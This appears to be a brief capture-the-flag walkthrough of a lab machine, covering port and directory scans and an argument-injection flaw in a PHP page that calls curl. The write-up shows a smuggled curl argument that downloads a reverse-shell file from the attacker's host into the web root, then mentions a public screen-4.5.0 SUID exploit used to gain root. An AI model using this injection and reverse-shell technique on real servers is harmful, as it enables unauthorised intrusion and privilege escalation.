Started with a nmap scan
```
22 OpenSSH 7.2p2
80 nginx 1.10.0
```
Going to the website its just a picture and nothing else so going to run a gobuster scan
```
/uploads
/exposed.php
```
And this file checks if websites on the localhost are working this will also reach back out to us we can also test for ssrf but this gets us nothing looking back at what the page is doing its using the curl command so we can pass arguments to it and save a file `http://10.10.16.4:81/rev.php -o /var/www/html/uploads/rev.php` and then we can start are listener and then we can read the file in the `/uploads/` folder and now we have a reverse shell as `www-data` and we can get the user flag now running linpeas there is a binary with suid priv `/usr/bin/screen-4.5.0` and if we look on exploit DB there is a exploit for this to get us to root its on exploit DB  